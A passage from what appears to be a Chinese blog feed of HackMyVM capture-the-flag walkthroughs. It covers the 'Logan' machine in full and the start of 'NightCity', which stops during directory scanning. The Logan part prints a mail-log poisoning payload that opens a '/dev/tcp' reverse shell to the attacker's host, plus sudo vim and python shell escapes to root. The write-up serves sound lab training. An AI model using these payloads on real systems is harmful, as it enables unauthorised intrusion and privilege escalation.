         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://logan.hmv
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           <span class="token builtin class-name">:</span> Host: FUZZ.logan.hmv
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">40</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
 :: Filter           <span class="token builtin class-name">:</span> Response size: <span class="token number">65</span>
________________________________________________

admin                   <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">1112</span>, Words: <span class="token number">300</span>, Lines: <span class="token number">63</span>, Duration: 554ms<span class="token punctuation">]</span></code></pre>
<p>扫出来一个子域<code>admin.logan.hmv</code>,添加到hosts</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><img src="https://ooo.0x0.ooo/2024/04/24/Oppqpx.png" alt="Oppqpx.png" loading="lazy"><br>又文件上传点，不过我试了修改类型，添加文件头，改后缀，截断，直接上传一个图片发现都没用……<br>在Payment测试了几下发现可以文件包含<br><img src="https://ooo.0x0.ooo/2024/04/24/Opp5Yj.png" alt="Opp5Yj.png" loading="lazy"><br>尝试apache日志包含getshell失败<br><img src="https://ooo.0x0.ooo/2024/04/24/OppT5p.png" alt="OppT5p.png" loading="lazy"><br>不够可以包含mail日志<br><img src="https://ooo.0x0.ooo/2024/04/24/OppUKU.png" alt="OppUKU.png" loading="lazy"><br>想到开启了smtp服务，尝试mail日志包含getshell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc 192.168.56.160 25      </span>
<span class="token number">220</span> logan.hmv ESMTP Postfix <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
MAIL FROM: ta0  
<span class="token number">250</span> <span class="token number">2.1</span>.0 Ok
RCPT TO: <span class="token operator">&lt;</span>?php exec<span class="token punctuation">(</span><span class="token string">'bash -c "/bin/bash -i >&amp; /dev/tcp/192.168.56.104/4567 0>&amp;1"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>
<span class="token number">501</span> <span class="token number">5.1</span>.3 Bad recipient address syntax</code></pre>
<p>然后再包含一下日志kali就会弹回一个shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567         </span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.160<span class="token punctuation">]</span> <span class="token number">52504</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">894</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@logan:/var/www/admin$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>
www-data@logan:/var/www/admin$ </code></pre>
<h2 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h2><p><em>sudo</em></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@logan:/var/www/admin$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on logan:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin,
    use_pty

User www-data may run the following commands on logan:
    <span class="token punctuation">(</span>logan<span class="token punctuation">)</span> NOPASSWD: /usr/bin/vim</code></pre>
<p>简单的vim提权 底端命令行输入!bash拿到logan权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@logan:/var/www/admin$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> logan /usr/bin/vim
<span class="token function">sudo</span> <span class="token parameter variable">-u</span> logan /usr/bin/vim
Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal

E558: Terminal entry not found <span class="token keyword">in</span> terminfo
<span class="token string">'unknown'</span> not known. Available <span class="token builtin class-name">builtin</span> terminals are:
    builtin_amiga
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to <span class="token string">'ansi'</span>





^<span class="token punctuation">[</span>:<span class="token operator">!</span>bash
~
~
~
~
~                              VIM - Vi IMproved
~
~                               version <span class="token number">8.2</span>.4919
~                           by Bram Moolenaar et al.
~                   Modified by team+vim@tracker.debian.org
~                 Vim is <span class="token function">open</span> <span class="token builtin class-name">source</span> and freely distributable
~
~                        Become a registered Vim user<span class="token operator">!</span>
~                <span class="token builtin class-name">type</span>  :help register<span class="token operator">&lt;</span>Enter<span class="token operator">></span>   <span class="token keyword">for</span> information
~
~                <span class="token builtin class-name">type</span>  :q<span class="token operator">&lt;</span>Enter<span class="token operator">></span>               to <span class="token builtin class-name">exit</span>
~                <span class="token builtin class-name">type</span>  :help<span class="token operator">&lt;</span>Enter<span class="token operator">></span>  or  <span class="token operator">&lt;</span>F<span class="token operator"><span class="token file-descriptor important">1</span>></span>  <span class="token keyword">for</span> on-line <span class="token builtin class-name">help</span>
~                <span class="token builtin class-name">type</span>  :help version<span class="token operator"><span class="token file-descriptor important">8</span>&lt;</span>Enter<span class="token operator">></span>   <span class="token keyword">for</span> version info
~
~
~
~
~
:<span class="token operator">!</span>bash                                                        
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>logan<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>logan<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>logan<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,1002<span class="token punctuation">(</span>administration<span class="token punctuation">)</span></code></pre>
<p>升级一下shell<br><img src="https://ooo.0x0.ooo/2024/04/24/OppWSY.png" alt="OppWSY.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">logan@logan:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-xrwx <span class="token number">4</span> logan logan <span class="token number">4096</span> Jul <span class="token number">18</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root  root  <span class="token number">4096</span> Jul <span class="token number">17</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root  root     <span class="token number">9</span> Jul <span class="token number">17</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-x <span class="token number">1</span> logan logan  <span class="token number">220</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-x <span class="token number">1</span> logan logan <span class="token number">3771</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bashrc
drwx---r-x <span class="token number">2</span> logan logan <span class="token number">4096</span> Jul  <span class="token number">3</span>  <span class="token number">2023</span> .cache
drwxrwxr-x <span class="token number">3</span> logan logan <span class="token number">4096</span> Jul <span class="token number">17</span>  <span class="token number">2023</span> .local
-rw-r--r-x <span class="token number">1</span> logan logan  <span class="token number">807</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .profile
-rw-r--r-x <span class="token number">1</span> logan logan    <span class="token number">0</span> Jul  <span class="token number">3</span>  <span class="token number">2023</span> .sudo_as_admin_successful
-rw-r--r-- <span class="token number">1</span>  <span class="token number">1002</span>  <span class="token number">1003</span>   <span class="token number">68</span> Jul <span class="token number">17</span>  <span class="token number">2023</span> to-do
-rw-r--r-- <span class="token number">1</span> logan logan   <span class="token number">16</span> Jul <span class="token number">17</span>  <span class="token number">2023</span> user.txt
logan@logan:~$ <span class="token function">cat</span> user.txt 
User: *******</code></pre>
<p>拿到user flag</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>logan目录下有个to-do</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">logan@logan:~$ <span class="token function">cat</span> to-do 
- Go outside
- Try the new script that gave me root to learn python</code></pre>
<p>大概是通过python提权root<br>故技重施<em>sudo -l</em></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">logan@logan:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> logan on logan:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin,
    use_pty

User logan may run the following commands on logan:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3 /opt/learn_some_python.py</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">logan@logan:~$ <span class="token function">sudo</span> /usr/bin/python3 /opt/learn_some_python.py
Welcome<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>

 The first you need to now is how to use print, please <span class="token builtin class-name">type</span> print<span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span>

print<span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span>
hello</code></pre>
<p>发现输入的东西会被执行，那么直接开个bash</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">logan@logan:~$ <span class="token function">sudo</span> /usr/bin/python3 /opt/learn_some_python.py
Welcome<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>

 The first you need to now is how to use print, please <span class="token builtin class-name">type</span> print<span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span>

<span class="token function">import</span> os<span class="token punctuation">;</span>os.system<span class="token punctuation">(</span><span class="token string">'/bin/bash'</span><span class="token punctuation">)</span>
root@logan:/home/logan<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
root@logan:/home/logan<span class="token comment"># cat /root/r*</span>
Root: ******</code></pre>
<p>成功root。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>mail日志包含</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-NightCity</title>
    <url>/posts/dee12de6/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.174</strong></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.174 -sV -A -p-</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-05-15 <span class="token number">17</span>:47 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.174
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0022s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>     vsftpd <span class="token number">2.0</span>.8 or later
<span class="token operator">|</span> ftp-syst: 
<span class="token operator">|</span>   STAT: 
<span class="token operator">|</span> FTP server status:
<span class="token operator">|</span>      Connected to <span class="token number">192.168</span>.56.104
<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
<span class="token operator">|</span>      TYPE: ASCII
<span class="token operator">|</span>      No session bandwidth limit
<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is <span class="token number">300</span>
<span class="token operator">|</span>      Control connection is plain text
<span class="token operator">|</span>      Data connections will be plain text
<span class="token operator">|</span>      At session startup, client count was <span class="token number">1</span>
<span class="token operator">|</span>      vsFTPd <span class="token number">3.0</span>.3 - secure, fast, stable
<span class="token operator">|</span>_End of status
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_drwxrwxrwx    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun 09  <span class="token number">2022</span> reminder <span class="token punctuation">[</span>NSE: writeable<span class="token punctuation">]</span>
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.6p1 Ubuntu 4ubuntu0.7 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> ce:ac:1c:04:d6:f6:64:d6:d9:9d:88:c9:0d:66:a9:45 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 4f:f1:7b:69:5c:47:b2:91:b8:d2:2f:82:73:b7:fc:03 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">65</span>:6b:3b:8c:89:81:4d:f3:98:98:5a:ed:57:cf:58:c9 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.29 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: NightCity Web Server
<span class="token operator">|</span>_http-server-header: Apache/2.4.29 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
MAC Address: 08:00:27:EA:9B:0B <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>, Linux <span class="token number">5.0</span> - <span class="token number">5.5</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">2.24</span> ms <span class="token number">192.168</span>.56.174

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">16.89</span> seconds</code></pre>
<p>开放了 21 22 80三个端口，21端口ftp服务可以匿名访问</p>
<h2 id="ftp匿名访问"><a href="#ftp匿名访问" class="headerlink" title="ftp匿名访问"></a>ftp匿名访问</h2><pre class="language-bash" data-language="bash"><code class="language-bash">                                                                                                                                                                                                                                                                                                                           
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ftp 192.168.56.174             </span>
Connected to <span class="token number">192.168</span>.56.174.
<span class="token number">220</span> Welcome to the NightCity Server<span class="token operator">!</span><span class="token operator">!</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.56.174:root<span class="token punctuation">)</span>: anonymous
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">18504</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxrwxrwx    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun 09  <span class="token number">2022</span> reminder
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">27877</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="token number">3</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun 09  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">3</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun 09  <span class="token number">2022</span> <span class="token punctuation">..</span>
drwxrwxrwx    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun 09  <span class="token number">2022</span> reminder
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> <span class="token builtin class-name">cd</span> reminder
<span class="token number">250</span> Directory successfully changed.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-alk</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">25685</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxrwxrwx    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun 09  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">3</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun 09  <span class="token number">2022</span> <span class="token punctuation">..</span>
-rwxr-xr-x    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>              <span class="token number">33</span> Jun 09  <span class="token number">2022</span> reminder.txt
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> get reminder.txt
local: reminder.txt remote: reminder.txt
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">29822</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> reminder.txt <span class="token punctuation">(</span><span class="token number">33</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>******************************************************************************************************************************************************************************************************************<span class="token operator">|</span>    <span class="token number">33</span>        <span class="token number">0.37</span> KiB/s    00:00 ETA226 Transfer complete.
<span class="token number">33</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">0.37</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> quit
<span class="token number">221</span> Goodbye.
                                                                                                                                                                                                                                                                                                                           
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat reminder.txt </span>
Local user is <span class="token keyword">in</span> the coordinates</code></pre>
<blockquote>
<p>Local user is in the coordinates<br>本地用户在坐标中</p>
</blockquote>
<p>暂时不懂干什么用的，先留着</p>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>web界面源码看了，没什么域名，网站功能点也点了几下，也没有什么东西，直接扫目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://192.168.56.174 -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.174
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              zip,html,txt,php,bak
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">8407</span><span class="token punctuation">]</span>
/images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">317</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.174/images/<span class="token punctuation">]</span>
/contact.html         <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">6349</span><span class="token punctuation">]</span>
/about.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">7744</span><span class="token punctuation">]</span>
/gallery.html         <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">8768</span><span class="token punctuation">]</span>
/js                   <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">313</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.174/js/<span class="token punctuation">]</span>
/robots.txt           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">136</span><span class="token punctuation">]</span>
/secret               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">317</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.174/secret/<span class="token punctuation">]</span>
/robin                <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1873</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
Progress: <span class="token number">676813</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">51.14</span>%<span class="token punctuation">)</span>^C
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
Progress: <span class="token number">676904</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">51.15</span>%<span class="token punctuation">)</span>
